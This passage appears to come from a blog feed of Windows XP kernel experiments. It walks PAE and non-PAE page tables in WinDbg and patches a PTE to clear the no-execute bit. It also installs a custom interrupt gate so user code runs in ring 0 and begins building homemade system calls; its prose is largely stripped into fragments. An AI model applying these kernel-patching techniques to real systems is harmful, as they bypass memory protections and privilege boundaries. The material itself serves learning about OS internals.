prompt_">kd&gt; </span><span class="language-bash">.formats 004197B0</span></span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     004197b0</span><br><span class="line">  Decimal: 4298672</span><br><span class="line">  Decimal (unsigned) : 4298672</span><br><span class="line">  Octal:   00020313660</span><br><span class="line">  Binary:  00000000 01000001 10010111 10110000</span><br><span class="line">  Chars:   .A..</span><br><span class="line">  Time:    Fri Feb 20 02:04:32 1970</span><br><span class="line">  Float:   low 6.02372e-039 high 0</span><br><span class="line">  Double:  2.12383e-317</span><br></pre></td></tr></table></figure><p>2-9-9-12</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00</span> <span class="comment">//0</span></span><br><span class="line"><span class="number">000000010</span> <span class="comment">//2</span></span><br><span class="line"><span class="number">000011001</span> <span class="comment">//0x19</span></span><br><span class="line"><span class="number">011110110000</span> <span class="comment">//0x7b0</span></span><br></pre></td></tr></table></figure><p>DirBase08c902a0</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dq 08c902a0 + 0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">8c902a0 00000000`0ca6c001 00000000`0ca6d001</span></span><br></pre></td></tr></table></figure><p>0ca6c000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dq 0ca6c000 + 8 * 2</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ca6c010 00000000`0ca7c067 00000000`00000000</span></span><br></pre></td></tr></table></figure><p>0ca7c000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dq 0ca7c000 + 8 * 0x19</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">ca7c0c8 80000000`0cc1f067 80000000`0cb78067</span></span><br></pre></td></tr></table></figure><p>0cc1f000</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !db <span class="number">0</span>cc1f000 + <span class="number">0x7b0</span></span><br><span class="line"># cc1f7b0 <span class="number">78</span> <span class="number">56</span> <span class="number">34</span> <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span><span class="number">-00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> xV4.............</span><br></pre></td></tr></table></figure><p>!vtop</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!vtop 08c902a0 004197B0</span></span><br><span class="line">X86VtoP: Virt 00000000004197b0, pagedir 0000000008c902a0</span><br><span class="line">X86VtoP: PAE PDPE 0000000008c902a0 - 000000000ca6c001</span><br><span class="line">X86VtoP: PAE PDE 000000000ca6c010 - 000000000ca7c067</span><br><span class="line">X86VtoP: PAE PTE 000000000ca7c0c8 - 800000000cc1f067</span><br><span class="line">X86VtoP: PAE Mapped phys 000000000cc1f7b0</span><br><span class="line">Virtual address 4197b0 translates to physical address cc1f7b0.</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><img src="/2023/06/02/Windows-Kernel-Experiment-PAE-paging/image-20230602130747486.png" alt="image-20230602130747486"></p><p>2^2 * 2^9 * 2^9 * 8byte &#x3D; 8Mb 0xc060 0000</p><p>4k * 2^9 * 2^9 &#x3D; 1G</p><p>4k * 2^9 &#x3D; 2M </p><p>4k</p><p>()</p><p>&#x3D;((address &gt;&gt; 12) &lt;&lt; 3) + 0xc0000000</p><p> &#x3D; ((address &gt;&gt; 21) &lt;&lt;3) + 0xc0600000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 815b6020  SessionId: 0  Cid: 0154    Peb: 7ffd3000  ParentCid: 04b8</span><br><span class="line">    DirBase: 08c902a0  ObjectTable: e24c4a90  HandleCount:  17.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 815b6020</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">80528bdc cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=08c902a0</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                    VA 004197b0</span><br><span class="line">PDE at C0600010            PTE at C00020C8</span><br><span class="line">contains 000000000CA7C067  contains 800000000CC1F067</span><br><span class="line">pfn ca7c      ---DA--UWEV  pfn cc1f      ---DA--UW-V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0&gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">3</span>) + <span class="number">0</span>xc0000000</span></span><br><span class="line">unsigned int 0xc00020c8</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0&gt;&gt; <span class="number">21</span>) &lt;&lt; <span class="number">3</span>) + <span class="number">0</span>xc0600000</span></span><br><span class="line">unsigned int 0xc0600010</span><br></pre></td></tr></table></figure><p>pte800000000CC1F067dx1 DAUW-V</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq C00020C8 l1</span></span><br><span class="line">c00020c8  80000000`0cc1f067</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                    VA 004197b0</span><br><span class="line">PDE at C0600010            PTE at C00020C8</span><br><span class="line">contains 000000000CA7C067  contains 800000000CC1F067</span><br><span class="line">pfn ca7c      ---DA--UWEV   pfn cc1f      ---DA--UW-V</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">eq C00020C8 00000000`0cc1f067</span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                    VA 004197b0</span><br><span class="line">PDE at C0600010            PTE at C00020C8</span><br><span class="line">contains 000000000CA7C067  contains 000000000CC1F067</span><br><span class="line">pfn ca7c      ---DA--UWEV   pfn cc1f      ---DA--UWEV</span><br></pre></td></tr></table></figure><p>E DAUWEV</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:PAE(Non-PAE paging)</title>
      <link href="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/"/>
      <url>/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows-PAE-Non-PAE-paging"><a href="#Windows-PAE-Non-PAE-paging" class="headerlink" title="Windows:PAE(Non-PAE paging)"></a>Windows:PAE(Non-PAE paging)</h1><p><strong>PAE(Physical Address Extension)</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /noexecute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><p>noexecuteexecute,pae</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">multi(<span class="number">0</span>)disk(<span class="number">0</span>)rdisk(<span class="number">0</span>)partition(<span class="number">1</span>)\WINDOWS=<span class="string">&quot;Microsoft Windows XP Home Edition DEBUG&quot;</span> /execute=optin /fastdetect /debugport=COM1 /baudrate=<span class="number">115200</span></span><br></pre></td></tr></table></figure><p>cr4(0)pae</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.formats cr4</span></span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     000006d9</span><br><span class="line">  Decimal: 1753</span><br><span class="line">  Decimal (unsigned) : 1753</span><br><span class="line">  Octal:   00000003331</span><br><span class="line">  Binary:  00000000 00000000 00000110 11011001</span><br><span class="line">  Chars:   ....</span><br><span class="line">  Time:    Thu Jan  1 08:29:13 1970</span><br><span class="line">  Float:   low 2.45648e-042 high 0</span><br><span class="line">  Double:  8.66097e-321</span><br></pre></td></tr></table></figure><p>0pae</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">include &lt;windows.h&gt;</span></span><br><span class="line">DWORD local_num = 0x12345678;</span><br><span class="line">DWORD g_cr3;</span><br><span class="line">void __declspec(naked) IdtEntry() &#123;//call</span><br><span class="line">    __asm &#123;</span><br><span class="line">        mov eax,cr3</span><br><span class="line">        mov g_cr3, eax</span><br><span class="line">        iretd</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">void interrupt() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        int 0x20</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main() &#123;</span><br><span class="line">    if (0x401040 != IdtEntry) &#123;</span><br><span class="line">        printf(&quot;IdtRntry address wrong&quot;);</span><br><span class="line">        system(&quot;pause&quot;);</span><br><span class="line">        exit(-1);</span><br><span class="line">    &#125;</span><br><span class="line">    //eq 8003f500  0040ee00`00081040</span><br><span class="line">    interrupt();</span><br><span class="line">    printf(&quot;g_cr3:0x%x\n&quot;, g_cr3);</span><br><span class="line">    printf(&quot;local num address:%p\n&quot;,&amp;local_num);</span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_cr3:<span class="number">0xdac000</span></span><br><span class="line">local num address:<span class="number">004197B</span>0</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>windbg</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !process <span class="number">0</span> <span class="number">0</span> test.exe</span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS <span class="number">81398480</span>  SessionId: <span class="number">0</span>  Cid: <span class="number">01e4</span>    Peb: <span class="number">7f</span>fd9000  ParentCid: <span class="number">04</span>a8</span><br><span class="line">    DirBase: <span class="number">00</span>dac000  ObjectTable: e2571638  HandleCount:  <span class="number">15.</span></span><br><span class="line">    Image: test.exe</span><br></pre></td></tr></table></figure><p><img src="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/image-20230601151108340.png" alt="image-20230601151108340"></p><p>dirbasecr3 ps: PDBR(Page Directory Base Register)</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.formats 004197B0</span></span><br><span class="line">Evaluate expression:</span><br><span class="line">  Hex:     004197b0</span><br><span class="line">  Decimal: 4298672</span><br><span class="line">  Decimal (unsigned) : 4298672</span><br><span class="line">  Octal:   00020313660</span><br><span class="line">  Binary:  00000000 01000001 10010111 10110000</span><br><span class="line">  Chars:   .A..</span><br><span class="line">  Time:    Fri Feb 20 02:04:32 1970</span><br><span class="line">  Float:   low 6.02372e-039 high 0</span><br><span class="line">  Double:  2.12383e-317</span><br></pre></td></tr></table></figure><p><img src="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/image-20230601152207229.png" alt="image-20230601152207229"></p><p>004197B0</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="number">01</span> <span class="comment">//0x1</span></span><br><span class="line"><span class="number">000001</span> <span class="number">1001</span> <span class="comment">//0x19</span></span><br><span class="line"><span class="number">0111</span> <span class="number">10110000</span> <span class="comment">//0x7B0</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">0xdac000</span></span><br><span class="line">#  dac000 <span class="number">0303</span>a067 <span class="number">00899067</span> <span class="number">00000000</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure><blockquote><p>windbg ! </p></blockquote><p> 0089906700899000</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !dd <span class="number">00899000</span> + <span class="number">0x19</span>*<span class="number">4</span></span><br><span class="line">#  <span class="number">899064</span> <span class="number">0025f</span>067 <span class="number">00861067</span> <span class="number">00004025</span> <span class="number">00000000</span></span><br></pre></td></tr></table></figure><p>PTE 0025f067 0025f000</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!db 0025f000 + 0x7B0</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> 25f7b0 78 56 34 12 00 00 00 00-00 00 00 00 00 00 00 00 xV4.............</span></span><br></pre></td></tr></table></figure><p>windbg<a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/-vtop">!vtop</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">!vtop PFN VirtualAddress </span><br><span class="line">PFN</span><br><span class="line">Specifies the page frame <span class="title function_">number</span> <span class="params">(PFN)</span> of the directory base <span class="keyword">for</span> the process.</span><br><span class="line">VirtualAddress</span><br><span class="line">Specifies the virtual address whose page is desired.</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; !vtop <span class="number">0xdac</span> <span class="number">004197B</span>0</span><br><span class="line">X86VtoP: Virt <span class="number">00000000004197b</span>0, pagedir <span class="number">0000000000</span>dac000</span><br><span class="line">X86VtoP: PDE <span class="number">0000000000</span>dac004 - <span class="number">00899067</span></span><br><span class="line">X86VtoP: PTE <span class="number">0000000000899064</span> - <span class="number">0025f</span>067</span><br><span class="line">X86VtoP: Mapped phys <span class="number">000000000025f</span>7b0</span><br><span class="line">Virtual address <span class="number">4197b</span>0 translates to physical address <span class="number">25f</span>7b0.</span><br></pre></td></tr></table></figure><h3 id="2G"><a href="#2G" class="headerlink" title="2G"></a>2G</h3><p>d2gdbg</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">kd&gt; db <span class="number">004197B</span>0</span><br><span class="line"><span class="number">004197b</span>0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????</span><br><span class="line"><span class="number">004197</span>c0  ?? ?? ?? ?? ?? ?? ?? ??-?? ?? ?? ?? ?? ?? ?? ??  ????????????????</span><br></pre></td></tr></table></figure><p>.process 81398480</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process 81398480</span></span><br><span class="line">ReadVirtual: 81398498 not properly sign extended</span><br><span class="line">Implicit process is now 81398480</span><br><span class="line">WARNING: .cache forcedecodeuser is not enabled</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">db 004197B0</span></span><br><span class="line">004197b0  78 56 34 12 00 00 00 00-00 00 00 00 00 00 00 00  xV4.............</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=00039000</span><br></pre></td></tr></table></figure><p>cr3</p><p>.process &#x2F;i 81398480(&#x2F;i ) g</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 81398480</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">804e4592 cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=00dac000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">db 004197B0</span></span><br><span class="line">004197b0  78 56 34 12 00 00 00 00-00 00 00 00 00 00 00 00  xV4.............</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><img src="/2023/06/01/Windows-Kernel-Experiment-Non-PAE-paging/image-20230601202830592.png" alt="image-20230601202830592"></p><p>0xc03000003g0xc00000001G0xc030 0000</p><blockquote><p>4k</p><p>0xc000 00003G0xc03000004k3G4M4M</p></blockquote><p>addr ((addr &gt;&gt; 12) &lt;&lt; 2) + 0xc0000000</p><blockquote><p>&gt;&gt;12page4kindex(4k)&lt;&lt;24byte</p></blockquote><p> ((addr &gt;&gt; 22) &lt;&lt;2) + 0xc0300000</p><blockquote><p>&gt;&gt;224M(4M)</p></blockquote><p><strong></strong></p><p>test.exe,cr3</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">g_cr3:<span class="number">0x1fcc000</span></span><br><span class="line">local num address:<span class="number">004197B</span>0</span><br><span class="line">. . .</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!process 0 0 test.exe</span></span><br><span class="line">Failed to get VadRoot</span><br><span class="line">PROCESS 8162dc30  SessionId: 0  Cid: 00c8    Peb: 7ffd6000  ParentCid: 04a4</span><br><span class="line">    DirBase: 01fcc000  ObjectTable: e2436230  HandleCount:  15.</span><br><span class="line">    Image: test.exe</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">.process /i 8162dc30</span></span><br><span class="line">You need to continue execution (press &#x27;g&#x27; &lt;enter&gt;) for the context</span><br><span class="line">to be switched. When the debugger breaks in again, you will be in</span><br><span class="line">the new process context.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">g</span></span><br><span class="line">ntStatus=0Break instruction exception - code 80000003 (first chance)</span><br><span class="line">nt!RtlpBreakWithStatusInstruction:</span><br><span class="line">804e4592 cc              int     3</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">r cr3</span></span><br><span class="line">cr3=01fcc000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!vtop 1fcc 004197B0</span></span><br><span class="line">X86VtoP: Virt 00000000004197b0, pagedir 0000000001fcc000</span><br><span class="line">X86VtoP: PDE 0000000001fcc004 - 007f3067</span><br><span class="line">X86VtoP: PTE 00000000007f3064 - 0c889067</span><br><span class="line">X86VtoP: Mapped phys 000000000c8897b0</span><br><span class="line">Virtual address 4197b0 translates to physical address c8897b0.</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!db c8897b0 l8</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">c8897b0 78 56 34 12 00 00 00 00 xV4......EN.....</span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!pte 004197B0</span></span><br><span class="line">                 VA 004197b0</span><br><span class="line">PDE at C0300004         PTE at C0001064</span><br><span class="line">contains 007F3067       contains 0C889067</span><br><span class="line">pfn 7f3   ---DA--UWEV   pfn c889  ---DA--UWEV</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0&gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">2</span>) + <span class="number">0</span>xc0000000</span></span><br><span class="line">unsigned int 0xc0001064</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dd <span class="number">0</span>xc0001064</span> </span><br><span class="line">c0001064  0c889067 0025b067 039aa025 00000000</span><br><span class="line">c0001074  00000000 00000000 00000000 00000000</span><br><span class="line">c0001084  00000000 00000000 00000000 00000000</span><br><span class="line">c0001094  00000000 00000000 00000000 00000000</span><br><span class="line">c00010a4  00000000 00000000 00000000 00000000</span><br><span class="line">c00010b4  00000000 00000000 00000000 00000000</span><br><span class="line">c00010c4  00000000 00000000 00000000 00000000</span><br><span class="line">c00010d4  00000000 00000000 00000000 00000000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dd <span class="number">00000000007</span>f3064</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3064 <span class="number">0</span>c889067 <span class="number">0025</span>b067 <span class="number">039</span>aa025 <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3074 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3084 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f3094 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30a4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30b4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30c4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"> <span class="number">7</span>f30d4 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">?? ((<span class="number">0</span>x04197B0 &gt;&gt; <span class="number">22</span>) &lt;&lt;<span class="number">2</span>) + <span class="number">0</span>xc0300000</span></span><br><span class="line">unsigned int 0xc0300004</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dd <span class="number">0</span>xc0300004</span></span><br><span class="line">ReadVirtual: c0300004 not properly sign extended</span><br><span class="line">c0300004  007f3067 00000000 00000000 00000000</span><br><span class="line">c0300014  00000000 00000000 00000000 00000000</span><br><span class="line">c0300024  00000000 00000000 00000000 00000000</span><br><span class="line">c0300034  00000000 00000000 00000000 00000000</span><br><span class="line">c0300044  00000000 00000000 00000000 00000000</span><br><span class="line">c0300054  00000000 00000000 00000000 00000000</span><br><span class="line">c0300064  00000000 00000000 00000000 00000000</span><br><span class="line">c0300074  00000000 00000000 00000000 00000000</span><br><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">!dd <span class="number">0000000001</span>fcc004</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc004 <span class="number">007</span>f3067 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc014 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc024 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc034 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc044 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc054 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc064 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="number">1</span>fcc074 <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span> <span class="number">00000000</span></span></span><br></pre></td></tr></table></figure><p></p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows Kernel Experiment </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows:(system call)</title>
      <link href="/2023/05/31/Windows-Kernel-Experiment-system-call/"/>
      <url>/2023/05/31/Windows-Kernel-Experiment-system-call/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows--system-call"><a href="#Windows--system-call" class="headerlink" title="Windows:(system call)"></a>Windows:(system call)</h1><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DWORD <span class="title function_">ReadMem</span><span class="params">(DWORD address)</span> </span><br><span class="line">DWORD <span class="title function_">AllocMem</span><span class="params">(DWORD size)</span> </span><br></pre></td></tr></table></figure><p>ExAllocatePool</p><p></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">kd&gt; </span><span class="language-bash">dq @gdtr l80</span></span><br><span class="line">8003f000  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">....... SystemCallEntry</span><br><span class="line">8003f120  00000000`8003f128 00000000`8003f130</span><br><span class="line">8003f130  00000000`8003f138 00000000`8003f140</span><br><span class="line">8003f140  00000000`8003f148 00000000`8003f150</span><br><span class="line">8003f150  00000000`8003f158 00000000`8003f160</span><br><span class="line">8003f160  00000000`8003f168 00000000`8003f170</span><br><span class="line">8003f170  00000000`8003f178 00000000`8003f180</span><br><span class="line">8003f180  00000000`8003f188 00000000`8003f190</span><br><span class="line">8003f190  00000000`8003f198 00000000`8003f1a0</span><br><span class="line">8003f1a0  00000000`8003f1a8 00000000`8003f1b0</span><br><span class="line">8003f1b0  00000000`8003f1b8 00000000`8003f1c0</span><br><span class="line">8003f1c0  00000000`8003f1c8 00000000`8003f1d0</span><br><span class="line">........  ReadMem</span><br><span class="line">8003f1d0  00000000`8003f1d8 00000000`8003f1e0</span><br><span class="line">8003f1e0  00000000`8003f1e8 00000000`8003f1f0</span><br><span class="line">8003f1f0  00000000`8003f1f8 00000000`8003f200</span><br><span class="line">8003f200  00000000`8003f208 00000000`8003f210</span><br><span class="line">........  AllocMem</span><br><span class="line">8003f210  00000000`8003f218 00000000`8003f220</span><br><span class="line">8003f220  00000000`8003f228 00000000`8003f230</span><br><span class="line">8003f230  00000000`8003f238 00000000`8003f240</span><br><span class="line">8003f240  00000000`8003f248 00000000`8003f250</span><br><span class="line">........</span><br><span class="line">8003f250  00000000`8003f258 00000000`8003f260</span><br><span class="line">8003f260  00000000`8003f268 00000000`8003f270</span><br><span class="line">........Service Table</span><br><span class="line">8003f270  00000000`8003f278 00000000`8003f280</span><br></pre></td></tr></table></figure><p>SystemCallEntryeaxService Table</p><p>makeKernel.exe</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> AD_CALLENTRY, AD_READ, AD_ALLOC &#125;;</span><br><span class="line">DWORD Address[<span class="number">3</span>] = &#123; <span class="number">0x8003f120</span> ,<span class="number">0x8003f1d0</span>,<span class="number">0x8003f210</span> &#125;;</span><br><span class="line">PDWORD ServiceTable = (PDWORD)<span class="number">0x8003f270</span>;</span><br><span class="line">PDWORD IdtAddress = (PDWORD)<span class="number">0x8003f508</span>;</span><br><span class="line"><span class="type">size_t</span> i;</span><br><span class="line"><span class="type">char</span>* des;</span><br><span class="line"><span class="type">void</span> <span class="title function_">SystemCallEntry</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">ReadMem</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">AllocMem</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> __declspec(naked) IdtEntry() &#123;</span><br><span class="line">    __asm &#123;</span><br><span class="line">        push <span class="number">0x30</span></span><br><span class="line">        pop fs</span><br><span class="line">        sti</span><br><span class="line">    &#125;</span><br><span class="line">    des = (<span class="type">char</span>*)Address[AD_CALLENTRY];</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">0xb0</span>; i++) &#123;</span><br><span class="line">        *des = ((<span class="type">char</span>*)SystemCallEntry)[i];</span><br><span class="line">        des++;</span><br><span class="line">    &#125;</span><br><span class="line">    des = (<span 